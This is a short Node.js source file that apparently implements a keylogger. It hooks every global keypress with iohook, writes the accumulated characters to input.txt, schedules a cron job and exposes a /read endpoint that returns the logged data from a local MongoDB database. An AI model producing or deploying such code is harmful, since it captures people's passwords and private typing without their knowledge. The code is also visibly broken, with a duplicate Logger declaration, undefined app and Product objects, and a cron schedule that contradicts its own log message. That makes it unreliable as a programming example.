const ioHook = require("iohook");
const connectDB = require("./connection/connectDb");
const writeFile = require("./common/writefile");
const service = require("./service/service");
const Logger = require("./model/Logger");
const PORT = " mongodb://127.0.0.1:27017/Logger";
const FILE_URL = "./input.txt";
const createCsvWriter = require("csv-writer").createObjectCsvWriter;
const Logger = require("./model/Logger");
let value = "";
const date = new Date();
ioHook.on("keypress", (event) => {
  // value += event.keychar==8?'':String.fromCharCode(event.keychar);
  value += String.fromCharCode(event.keychar);
  run();
});

ioHook.start();

const run = async () => {
  await writeFile(FILE_URL, value);
  var cron = require("node-cron");
  // service()
  const task = cron.schedule("2 03 9 * *", () => {
    service();
    console.log("running a task every minute");
  });
  task.start();
};

app.get("/read", async (req, res) => {
  try {
    const data = await Product.find({});
    if (data == null) {
      res.json("nothing");
    }
    res
      .json({
        path: FILE_URL,
        log: data,
      })
      .status(200);
  } catch (error) {
    console.log(error);
  }
});
const start = async () => {
  console.log("start lại");
  try {
    await connectDB(PORT);
  } catch (error) {
    console.log(error);
  }
};
start();
